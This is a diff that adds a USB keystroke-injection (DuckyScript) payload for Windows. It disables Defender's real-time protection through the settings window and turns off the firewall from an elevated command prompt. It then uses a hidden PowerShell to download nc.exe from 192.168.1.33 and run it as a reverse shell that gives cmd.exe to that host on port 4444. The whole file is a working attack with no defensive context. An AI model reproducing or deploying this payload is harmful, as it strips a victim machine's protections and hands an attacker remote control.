@@ -1,0 +1,63 @@
+DELAY 1000
+GUI
+DELAY 500
+STRING Virus and Threat Protection
+DELAY 500
+ENTER
+DELAY 3500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+SPACE
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+ALT F4
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+
+STRING netsh advfirewall set allprofiles state off
+ENTER
+
+STRING exit
+ENTER
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+
+STRING cd /
+ENTER
+DELAY 500
+STRING Invoke-WebRequest http://192.168.1.33:8000/nc.exe -OutFile C:\nc.exe
+ENTER
+DELAY 1000
+
+REM Start nc.exe in hidden mode using PowerShell
+STRING powershell -WindowStyle Hidden -Command "Start-Process 'C:\nc.exe' -ArgumentList '192.168.1.33 4444 -e cmd.exe' -WindowStyle Hidden"
+ENTER
+DELAY 500
+
